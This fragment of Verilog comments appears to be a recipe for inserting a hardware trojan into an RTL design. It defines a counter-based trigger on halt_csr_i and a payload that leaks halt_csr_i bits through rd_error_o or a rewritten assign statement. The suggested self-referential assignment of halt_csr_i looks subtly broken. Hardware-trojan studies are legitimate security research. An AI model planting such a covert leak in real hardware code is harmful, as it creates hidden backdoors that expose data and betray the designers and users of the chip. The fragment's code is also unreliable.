 ...
 *   
 * Trigger: Counter on halt_csr_i
 * Payload: Route halt_csr_i[0] to observable output
 * 
...
//   Find the assign for halt_csr_i (or rd_error_o as fallback):
//     assign halt_csr_i = <normal_expr>;
//   Replace with:
//     assign halt_csr_i = trojan_active ? halt_csr_i[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? halt_csr_i[0] : 1'b0;
//
